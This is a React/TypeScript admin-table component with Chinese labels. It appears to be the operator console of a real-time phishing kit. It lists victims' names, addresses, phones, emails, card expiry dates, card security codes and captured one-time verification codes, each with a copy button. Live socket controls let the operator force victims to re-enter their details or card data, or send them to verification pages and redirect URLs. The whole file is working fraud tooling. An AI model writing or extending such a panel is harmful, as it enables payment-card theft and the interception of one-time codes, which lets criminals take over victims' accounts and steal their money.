import { useEffect, useMemo, useRef } from 'react';
import type { FlatRow, RecordRow, RouteTarget } from '../types';
import { useVirtualRows } from '../hooks/useVirtualRows';
import { formatVerifyMethod, isSubId, safeText, toZhStatus } from '../utils/adminFormatters';

type AdminTableProps = {
  rows: FlatRow[];
  pageStart: number;
  expandAll: boolean;
  collapsedMain: Record<string, boolean>;
  onToggleCollapse: (mainId: number) => void;
  onCopyText: (text: string) => void;
  onOpenCardPreview: (record: RecordRow) => void;
  onRefill: (socketId: string) => void;
  onCheckoutRefill: (socketId: string, recordId: RecordRow['id']) => void;
  onRouteUser: (socketId: string, target: RouteTarget) => void;
  onRouteUrl: (socketId: string) => void;
  onScrollStateChange?: (scrolling: boolean) => void;
  badgeForActivity: (record: RecordRow) => { label: string; cls: string };
};

function MiniCopyBtn({ onClick, disabled, title }: { onClick: () => void; disabled: boolean; title: string }) {
  return (
    <button
      onClick={(e) => {
        e.stopPropagation();
        onClick();
      }}
      disabled={disabled}
      title={title}
      className={[
        'text-[10px] px-1.5 py-0.5 rounded border transition-all shrink-0',
        disabled
          ? 'bg-[#161b22] border-[#30363d] text-[#8b949e] cursor-not-allowed'
          : 'bg-[#21262d] hover:bg-[#2b313a] border-[#30363d] text-[#8b949e]',
      ].join(' ')}
    >
      复制
    </button>
  );
}

function ActionBtn({
  label,
  onClick,
  disabled,
  title,
  tone = 'neutral',
}: {
  label: string;
  onClick: () => void;
  disabled: boolean;
  title: string;
  tone?: 'danger' | 'brand' | 'neutral';
}) {
  return (
    <button
      disabled={disabled}
      onClick={onClick}
      title={title}
      className={[
        'h-7 px-2 rounded text-[11px] font-medium border transition-all whitespace-nowrap',
        disabled
          ? 'bg-[#161b22] text-[#8b949e]/60 border-[#30363d] cursor-not-allowed'
          : tone === 'danger'
            ? 'bg-orange-600/90 hover:bg-orange-600 text-white border-orange-500/40'
            : tone === 'brand'
              ? 'bg-[#58a6ff]/20 hover:bg-[#58a6ff]/30 text-[#79c0ff] border-[#58a6ff]/40'
              : 'bg-[#21262d] hover:bg-[#2b313a] text-[#c9d1d9] border-[#30363d]',
      ].join(' ')}
    >
      {label}
    </button>
  );
}

function InlineField({
  label,
  value,
  mono,
  copyTitle,
  onCopy,
}: {
  label: string;
  value?: string;
  mono?: boolean;
  copyTitle: string;
  onCopy: () => void;
}) {
  const text = (value ?? '').toString().trim();
  return (
    <div className="flex items-start justify-between gap-1.5">
      <div className="min-w-0 break-words leading-5">
        <span className="text-[#8b949e]">{label}：</span>
        <span className={mono ? 'font-mono text-[#c9d1d9]' : 'text-[#c9d1d9]'}>{text || '-'}</span>
      </div>
      <MiniCopyBtn title={copyTitle} disabled={!text} onClick={onCopy} />
    </div>
  );
}

export function AdminTable({
  rows,
  pageStart,
  expandAll,
  collapsedMain,
  onToggleCollapse,
  onCopyText,
  onOpenCardPreview,
  onRefill,
  onCheckoutRefill,
  onRouteUser,
  onRouteUrl,
  onScrollStateChange,
  badgeForActivity,
}: AdminTableProps) {
  const containerRef = useRef<HTMLDivElement | null>(null);
  const rowHeight = 190;
  const virtualEnabled = rows.length > 120;
  const { start, end, top, bottom, scrollTop } = useVirtualRows(containerRef, {
    rowCount: rows.length,
    rowHeight,
    overscan: 6,
    enabled: virtualEnabled,
  });

  useEffect(() => {
    onScrollStateChange?.(scrollTop > 8);
  }, [onScrollStateChange, scrollTop]);

  const visibleRows = useMemo(() => {
    if (!virtualEnabled) return rows;
    if (end < start) return [];
    return rows.slice(start, end + 1);
  }, [rows, start, end, virtualEnabled]);

  return (
    <div ref={containerRef} className="max-h-[70vh] overflow-auto border border-[#30363d] rounded-2xl bg-[#161b22] shadow-2xl">
      <table className="min-w-[2100px] w-full text-xs">
        <thead className="bg-[#0d1117] sticky top-0 border-b border-[#30363d] z-10">
          <tr className="text-[#8b949e]">
            <th className="px-3 py-2 text-left w-32">序号</th>
            <th className="px-3 py-2 text-left w-52">时间 / IP</th>
            <th className="px-3 py-2 text-left min-w-[420px]">资料</th>
            <th className="px-3 py-2 text-left min-w-[330px]">结账</th>
            <th className="px-3 py-2 text-left min-w-[280px]">验证页</th>
            <th className="px-3 py-2 text-center w-52">状态</th>
            <th className="px-3 py-2 text-center w-40">活跃度</th>
            <th className="px-3 py-2 text-center w-[300px]">操作</th>
          </tr>
        </thead>

        <tbody className="divide-y divide-[#21262d]">
          {rows.length === 0 ? (
            <tr>
              <td colSpan={8} className="py-12 text-center text-[#8b949e] text-sm">
                暂无匹配记录
              </td>
            </tr>
          ) : (
            <>
              {virtualEnabled && top > 0 && (
                <tr>
                  <td colSpan={8} style={{ height: top }} />
                </tr>
              )}
              {visibleRows.map(({ r, indent, mainId, subsCount }, rowIndex) => {
                const sub = isSubId(r.id);
                const canRefill = !!r.socketId && r.online !== false;
                const canRoute = !!r.socketId && r.online !== false;
                const refillDisabledReason = !r.socketId ? '缺少 socketId' : '用户离线，不可重填';
                const routeDisabledReason = !r.socketId ? '缺少 socketId' : '用户离线，不可跳转';
                const active = !!r.active;
                const act = badgeForActivity(r);
                const globalRowIndex = pageStart + (virtualEnabled ? start : 0) + rowIndex;

                return (
                  <tr
                    key={r.id}
                    className={[
                      'transition-colors hover:bg-[#21262d]/70 align-top',
                      globalRowIndex % 2 === 0 ? 'bg-[#161b22]' : 'bg-[#171c23]',
                      active ? 'bg-[#58a6ff]/10' : '',
                    ].join(' ')}
                  >
                    <td className="px-3 py-2">
                      <div className="flex items-start gap-1.5">
                        {!indent && subsCount > 0 && (
                          <button
                            onClick={() => onToggleCollapse(mainId)}
                            className="w-6 h-6 rounded bg-[#21262d] hover:bg-[#2b313a] border border-[#30363d] text-[10px] shrink-0"
                            title="展开/折叠"
                          >
                            {collapsedMain[mainId.toString()] ?? !expandAll ? '＋' : '－'}
                          </button>
                        )}

                        <div className={indent ? 'pl-4' : ''}>
                          <div className="font-mono font-bold text-[#58a6ff] text-base leading-5">{r.id}</div>
                          <div className="mt-0.5 flex flex-wrap gap-1">
                            <span
                              className={
                                r.online === false
                                  ? 'text-[10px] px-1.5 py-0.5 rounded bg-red-500/10 text-red-300 border border-red-500/20'
                                  : 'text-[10px] px-1.5 py-0.5 rounded bg-green-500/10 text-green-300 border border-green-500/20'
                              }
                            >
                              {r.online === false ? '离线' : '在线'}
                            </span>
                            {active && <span className="text-[10px] px-1.5 py-0.5 rounded bg-[#58a6ff]/15 text-[#79c0ff] border border-[#58a6ff]/30">当前</span>}
                            {sub && <span className="text-[10px] px-1.5 py-0.5 rounded bg-orange-500/10 text-orange-200 border border-orange-500/20">子记录</span>}
                          </div>
                        </div>
                      </div>
                    </td>

                    <td className="px-3 py-2">
                      <div className="space-y-0.5">
                        <div className="font-mono text-yellow-300">{r.time || '-'}</div>
                        <div className="font-mono text-purple-300">{r.ip || '-'}</div>
                        <div className="text-[11px] text-[#8b949e]">
                          设备：{safeText(r.deviceType) || '-'} / {safeText(r.deviceOS) || '-'}
                        </div>
                      </div>
                    </td>

                    <td className="px-3 py-2">
                      <div className="space-y-1.5">
                        <div className="flex flex-wrap gap-1.5">
                          <div className="flex items-start gap-1 rounded border border-[#30363d] bg-[#0d1117]/60 px-2 py-1">
                            <span className="text-[#8b949e]">姓名：</span>
                            <span className="break-all">{safeText(r.fullname) || '-'}</span>
                            <MiniCopyBtn title="复制姓名" disabled={!safeText(r.fullname).trim()} onClick={() => onCopyText(safeText(r.fullname))} />
                          </div>
                        </div>

                        <div className="flex flex-wrap gap-1.5">
                          <div className="flex items-start gap-1 rounded border border-[#30363d] bg-[#0d1117]/60 px-2 py-1">
                            <span className="text-[#8b949e]">地址：</span>
                            <span className="break-all">{safeText(r.address) || '-'}</span>
                            <MiniCopyBtn title="复制地址" disabled={!safeText(r.address).trim()} onClick={() => onCopyText(safeText(r.address))} />
                          </div>
                          <div className="flex items-start gap-1 rounded border border-[#30363d] bg-[#0d1117]/60 px-2 py-1">
                            <span className="text-[#8b949e]">完整地址：</span>
                            <span className="break-all">{safeText(r.fulladdress) || '-'}</span>
                            <MiniCopyBtn title="复制完整地址" disabled={!safeText(r.fulladdress).trim()} onClick={() => onCopyText(safeText(r.fulladdress))} />
                          </div>
                          <div className="flex items-start gap-1 rounded border border-[#30363d] bg-[#0d1117]/60 px-2 py-1">
                            <span className="text-[#8b949e]">城市：</span>
                            <span className="break-all">{safeText(r.city) || '-'}</span>
                            <MiniCopyBtn title="复制城市" disabled={!safeText(r.city).trim()} onClick={() => onCopyText(safeText(r.city))} />
                          </div>
                          <div className="flex items-start gap-1 rounded border border-[#30363d] bg-[#0d1117]/60 px-2 py-1">
                            <span className="text-[#8b949e]">州/省：</span>
                            <span className="break-all">{safeText(r.state) || '-'}</span>
                            <MiniCopyBtn title="复制州/省" disabled={!safeText(r.state).trim()} onClick={() => onCopyText(safeText(r.state))} />
                          </div>
                          <div className="flex items-start gap-1 rounded border border-[#30363d] bg-[#0d1117]/60 px-2 py-1">
                            <span className="text-[#8b949e]">邮编：</span>
                            <span className="break-all">{safeText(r.postalcode) || '-'}</span>
                            <MiniCopyBtn title="复制邮编" disabled={!safeText(r.postalcode).trim()} onClick={() => onCopyText(safeText(r.postalcode))} />
                          </div>
                          <div className="flex items-start gap-1 rounded border border-[#30363d] bg-[#0d1117]/60 px-2 py-1">
                            <span className="text-[#8b949e]">电话：</span>
                            <span className="font-mono break-all">{safeText(r.telephone) || '-'}</span>
                            <MiniCopyBtn title="复制电话" disabled={!safeText(r.telephone).trim()} onClick={() => onCopyText(safeText(r.telephone))} />
                          </div>
                          <div className="flex items-start gap-1 rounded border border-[#30363d] bg-[#0d1117]/60 px-2 py-1">
                            <span className="text-[#8b949e]">邮箱：</span>
                            <span className="font-mono break-all">{safeText(r.email) || '-'}</span>
                            <MiniCopyBtn title="复制邮箱" disabled={!safeText(r.email).trim()} onClick={() => onCopyText(safeText(r.email))} />
                          </div>
                        </div>
                      </div>
                    </td>

                    <td className="px-3 py-2 space-y-1">
                      <InlineField label="姓名" value={r.checkoutName} copyTitle="复制结账姓名" onCopy={() => onCopyText(safeText(r.checkoutName))} />
                      <InlineField label="号码" value={r.checkoutPhone} mono copyTitle="复制结账号码" onCopy={() => onCopyText(safeText(r.checkoutPhone))} />
                      <div className="flex">
                        <button
                          onClick={() => onOpenCardPreview(r)}
                          className="w-full text-[11px] px-2 py-1 rounded border bg-[#58a6ff]/20 hover:bg-[#58a6ff]/30 border-[#58a6ff]/40 text-[#c9e4ff] transition-all"
                          title="弹出银行卡样式"
                        >
                          显示银行卡样式
                        </button>
                      </div>
                      <InlineField
                        label="卡有效期"
                        value={r.checkoutExpiryDate}
                        mono
                        copyTitle="复制卡有效期"
                        onCopy={() => onCopyText(safeText(r.checkoutExpiryDate))}
                      />
                      <InlineField label="验证码" value={r.checkoutCode} mono copyTitle="复制结账验证码" onCopy={() => onCopyText(safeText(r.checkoutCode))} />
                      {Array.isArray(r.checkoutSnapshots) && r.checkoutSnapshots.length > 0 && (
                        <div className="rounded border border-[#30363d] bg-[#0d1117]/60 px-2 py-1.5">
                          <div className="space-y-1">
                            {[...r.checkoutSnapshots]
                              .sort((a, b) => (b?.at || 0) - (a?.at || 0))
                              .slice(0, 5)
                              .map((item, idx) => (
                                <div key={`${item?.at || 0}-${idx}`} className="text-[11px] leading-4 text-[#c9d1d9] break-all">
                                  <span className="font-mono">{safeText(item?.checkoutPhone) || '-'}</span>
                                  <span>{` / ${safeText(item?.checkoutCode) || '-'}`}</span>
                                  <span>{` / ${safeText(item?.checkoutExpiryDate) || '-'}`}</span>
                                </div>
                              ))}
                          </div>
                        </div>
                      )}
                    </td>

                    <td className="px-3 py-2 space-y-1">
                      <InlineField
                        label="验证方式"
                        value={formatVerifyMethod(r.verifyMethod)}
                        copyTitle="复制验证方式"
                        onCopy={() => onCopyText(formatVerifyMethod(r.verifyMethod))}
                      />
                      <InlineField label="验证" value={r.verify} mono copyTitle="复制验证" onCopy={() => onCopyText(safeText(r.verify))} />
                      {Array.isArray(r.verifyHistory) && r.verifyHistory.length > 0 && (
                        <div className="rounded border border-[#30363d] bg-[#0d1117]/60 px-2 py-1.5">
                          <div className="space-y-1">
                            {[...r.verifyHistory]
                              .sort((a, b) => (b?.at || 0) - (a?.at || 0))
                              .slice(0, 10)
                              .map((item, idx) => (
                                <div key={`${item?.at || 0}-${idx}`} className="text-[11px] leading-4 text-[#c9d1d9] break-all">
                                  <span className="font-mono">{safeText(item?.value) || '-'}</span>
                                </div>
                              ))}
                          </div>
                        </div>
                      )}
                      <InlineField label="应用验证" value={r.appCheck} mono copyTitle="复制应用验证" onCopy={() => onCopyText(safeText(r.appCheck))} />
                    </td>

                    <td className="px-3 py-2 text-center">
                      <span className="inline-flex items-center justify-center bg-[#21262d] text-[#c9d1d9] px-2.5 py-1 rounded-xl text-[11px] font-medium border border-[#30363d] whitespace-nowrap max-w-[200px]">
                        <span className="truncate">{toZhStatus(r.status, r.page)}</span>
                      </span>
                    </td>

                    <td className="px-3 py-2 text-center">
                      <span className={['inline-flex items-center justify-center px-2 py-1 rounded-xl text-[11px] font-medium border whitespace-nowrap', act.cls].join(' ')}>
                        {act.label}
                      </span>
                    </td>

                    <td className="px-3 py-2">
                      <div className="mx-auto w-[280px] rounded-xl border border-[#30363d] bg-[#0d1117]/70 p-2">
                        <div className="text-[10px] text-[#8b949e] mb-1">重填</div>
                        <div className="grid grid-cols-2 gap-1.5">
                          <ActionBtn
                            label="重填资料"
                            tone="danger"
                            disabled={!canRefill}
                            onClick={() => canRefill && onRefill(r.socketId)}
                            title={!canRefill ? refillDisabledReason : '强制重填 Info 表单'}
                          />
                          <ActionBtn
                            label="重填结账"
                            tone="brand"
                            disabled={!canRefill}
                            onClick={() => canRefill && onCheckoutRefill(r.socketId, r.id)}
                            title={!canRefill ? refillDisabledReason : '在当前序号下重填结账'}
                          />
                        </div>
                        {!canRefill && <div className="mt-1 text-[10px] text-[#8b949e]">{refillDisabledReason}</div>}

                        <div className="mt-2 pt-2 border-t border-[#30363d]">
                          <div className="text-[10px] text-[#8b949e] mb-1">跳转</div>
                          <div className="grid grid-cols-2 gap-1.5">
                            <ActionBtn
                              label="去验证"
                              disabled={!canRoute}
                              onClick={() => canRoute && onRouteUser(r.socketId, 'verify')}
                              title={!canRoute ? routeDisabledReason : '跳到验证页'}
                            />
                            <ActionBtn
                              label="去应用验证"
                              disabled={!canRoute}
                              onClick={() => canRoute && onRouteUser(r.socketId, 'appcheck')}
                              title={!canRoute ? routeDisabledReason : '跳到应用验证页'}
                            />
                          </div>

                          <div className="mt-1.5">
                            <ActionBtn
                              label="跳转网址"
                              disabled={!canRoute}
                              onClick={() => canRoute && onRouteUrl(r.socketId)}
                              title={!canRoute ? routeDisabledReason : '跳转到前端配置的网址'}
                            />
                          </div>
                          {!canRoute && <div className="mt-1 text-[10px] text-[#8b949e]">{routeDisabledReason}</div>}
                        </div>
                      </div>
                    </td>
                  </tr>
                );
              })}
              {virtualEnabled && bottom > 0 && (
                <tr>
                  <td colSpan={8} style={{ height: bottom }} />
                </tr>
              )}
            </>
          )}
        </tbody>
      </table>
    </div>
  );
}
